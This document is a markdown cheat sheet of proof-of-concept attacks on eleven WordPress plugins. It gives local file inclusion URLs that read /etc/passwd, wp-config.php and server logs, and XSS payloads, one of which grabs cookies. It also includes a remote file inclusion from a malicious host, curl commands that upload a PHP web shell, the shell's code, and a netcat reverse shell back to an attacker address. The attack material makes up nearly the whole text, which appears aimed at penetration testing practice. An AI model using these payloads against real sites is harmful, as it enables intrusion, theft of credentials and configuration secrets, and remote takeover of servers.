### WordPress plugin vulnerabilities

#### mail-masta - LFI
- **PoC**:  
  `http://target.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

---

#### localize-my-post - LFI
- **PoC**:  
  `http://target.com/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../etc/passwd`  
  `http://target.com/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../var/log/apache2/access.log`

---

#### anti-plagiarism - XSS
- **PoC**:  
  `http://target.com/wp-content/plugins/anti-plagiarism/js.php?m=</script><script>alert(1)</script>`

---

#### simple-image-manipulator - LFI
- **PoC**:  
  `http://target.com/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../../wp-config.php`

---

#### activehelper-livehelp - XSS
- **PoC**:  
  `http://target.com/wp-content/plugins/activehelper-livehelp/server/offline.php?MESSAGE=MESSAGE<script>alert(document.cookie)</script>`

---

#### amministrazione-aperta - LFI
- **PoC**:  
  `http://target.com/wp-content/plugins/amministrazione-aperta/wpgov/dispatcher.php?open=../../../../etc/passwd`

---

#### buddypress-component-stats - RFI/LFI
- **PoC**:  
  `http://target.com/wp-content/plugins/buddypress-component-stats/lib/dompdf/dompdf.php?input_file=http://malicious-site.com/shell.txt`  
- **Note**: Remote File Inclusion (RFI) — allows loading malicious files from an external server.

---

#### e-search - XSS
- **PoC**:  
  `http://target.com/wp-content/plugins/e-search/tmpl/title_az.php?title_az=</title><svg/onload=alert(1)>`

---

#### dzs-videogallery - Arbitrary file upload → RCE
- **PoC**:  
  ```bash
  curl -F "file=@/home/kali/shell.php" https://target.com/wp-content/plugins/dzs-videogallery/admin/upload.php
  ```
- **Shell content**:
  ```php
  <?php
  system($_GET['cmd']);
  ?>
  ```
- **Access the shell**:  
  `https://target.com/wp-content/plugins/dzs-videogallery/uploads/shell.php?cmd=whoami`
- **Reverse shell with Netcat**:  
  `https://target.com/wp-content/plugins/dzs-videogallery/uploads/shell.php?cmd=nc -e /bin/bash YOUR_IP 4444`
- **Tip**: Use [Arjun](https://github.com/s0md3v/Arjun) to discover hidden form parameters.

---

#### fancy-product-designer - Arbitrary file upload → RCE or LFI
- **PoC**:  
  ```bash
  curl -F "image=@/home/kali/shell.php" https://target.com/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php
  ```
- **Same method as above** (dzs-videogallery)

---

#### hd-webplayer - LFI
- **PoC**:  
  `http://target.com/wp-content/plugins/hd-webplayer/playlist.php?file=../../../../wp-config.php`
